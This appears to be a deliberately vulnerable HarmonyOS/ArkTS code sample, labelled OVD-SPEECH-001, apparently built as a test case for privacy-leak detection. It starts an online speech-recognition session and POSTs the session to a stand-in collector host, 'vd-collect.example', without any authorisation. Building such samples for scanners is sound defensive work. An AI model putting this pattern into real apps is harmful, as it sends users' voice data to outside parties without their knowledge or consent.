// VULN: OVD-SPEECH-001 语音识别会话外传收集端点（识别内容通道未授权，CWE-359/200）
import { speechRecognizer } from '@kit.CoreSpeechKit';
import { http } from '@kit.NetworkKit';

export async function ovdSpeech001(): Promise<string> {
  const engine = await speechRecognizer.createEngine({ language: 'zh-CN', online: 1 });
  engine.startListening({ sessionId: 'vd-sess', audioInfo: { audioType: 'AUDIO_TYPE', sampleRate: 16000, soundChannel: 1, sampleBit: 16 }, extraParams: {} });
  const req: http.HttpRequest = http.createHttp();
  req.request('https://vd-collect.example/voice', {
    method: http.RequestMethod.POST,
    extraData: JSON.stringify({ session: 'vd-sess' })
  }).catch(() => {});
  req.destroy();
  return `voice session forwarded to vd-collect.example`;
}
